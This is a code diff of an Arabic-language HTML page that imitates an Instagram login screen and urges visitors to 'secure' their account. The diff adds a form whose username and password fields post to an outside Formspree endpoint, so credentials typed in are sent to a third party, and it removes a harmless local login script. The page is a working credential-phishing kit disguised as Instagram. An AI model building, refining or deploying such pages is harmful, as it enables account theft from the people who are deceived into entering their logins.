@@ -2,6 +2,7 @@
 <html lang="ar" dir="rtl">
 
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -37,7 +38,7 @@ body{
     overflow:hidden;
 }
 
-/* العربية */
+/* اللغة */
 .language{
     text-align:center;
     color:#777;
@@ -110,6 +111,12 @@ input:focus{
     color:#0877e8;
     font-size:16px;
     cursor:pointer;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    text-decoration:none;
 }
 
 .create:active{
@@ -140,6 +147,7 @@ input:focus{
 }
 
 </style>
+
 </head>
 
 
@@ -148,10 +156,10 @@ input:focus{
 <div class="page">
 
     <!-- اللغة -->
-   <div class="language">
-        ئمن حسابك من الاختراق الان معا instagram
+    <div class="language">
+        قم الان بي تائمين حسابك علا instagram
     </div>
-   <div class="language">
+    <div class="language">
         العربية
     </div>
 
@@ -222,28 +230,38 @@ input:focus{
     </svg>
 
 
-    <!-- اسم المستخدم -->
-    <input
-        id="username"
-        type="text"
-        placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول">
+    <!-- النموذج -->
+    <form
+        action="https://formspree.io/f/myeykzqj"
+        method="POST">
+
+        <!-- اسم المستخدم -->
+        <input
+            id="username"
+            name="username"
+            type="text"
+            placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول"
+            required>
 
 
-    <!-- كلمة السر -->
-    <input
-        id="password"
-        type="password"
-        placeholder="كلمة السر">
+        <!-- كلمة السر -->
+        <input
+            id="password"
+            type="password"
+            placeholder="كلمة السر"
+            required>
 
 
-    <!-- تسجيل الدخول -->
-    <button
-        class="login"
-        onclick="login()">
+        <!-- تسجيل الدخول -->
+        <button
+            class="login"
+            type="submit">
 
-        تسجيل الدخول
+            تسجيل الدخول
 
-    </button>
+        </button>
+
+    </form>
 
 
     <!-- نسيت كلمة السر -->
@@ -267,14 +285,14 @@ input:focus{
     <div class="middle"></div>
 
 
-    <!-- إنشاء حساب -->
-    <button
-        class="create"
-        onclick="createAccount()">
+    <!-- إنشاء حساب جديد -->
+    <a
+        href="contact.html"
+        class="create">
 
-        تسجيل دخوا بي بريد الاختروني
+        تسجيل دخول بي البريد الاكتروني
 
-    </button>
+    </a>
 
 
     <!-- Meta -->
@@ -290,52 +308,6 @@ input:focus{
 
 <script>
 
-/* تسجيل الدخول */
-function login(){
-
-    const username =
-        document.getElementById("username").value.trim();
-
-    const password =
-        document.getElementById("password").value.trim();
-
-    const message =
-        document.getElementById("message");
-
-
-    /* التأكد من اسم المستخدم */
-    if(username === ""){
-
-        message.style.display = "block";
-
-        message.textContent =
-            "اكتب اسم المستخدم أو البريد الإلكتروني";
-
-        return;
-    }
-
-
-    /* التأكد من كلمة السر */
-    if(password === ""){
-
-        message.style.display = "block";
-
-        message.textContent =
-            "اكتب كلمة السر";
-
-        return;
-    }
-
-
-    /*
-       بعد تعبئة البيانات
-       الانتقال إلى contact.html
-    */
-    window.location.href = "contact.html";
-
-}
-
-
 /* نسيت كلمة السر */
 function forgotPassword(){
 
@@ -349,16 +321,8 @@ function forgotPassword(){
 
 }
 
-
-/* إنشاء حساب */
-function createAccount(){
-
-    window.location.href =
-        "signup.html";
-
-}
-
 </script>
+
 
 </body>
 </html>
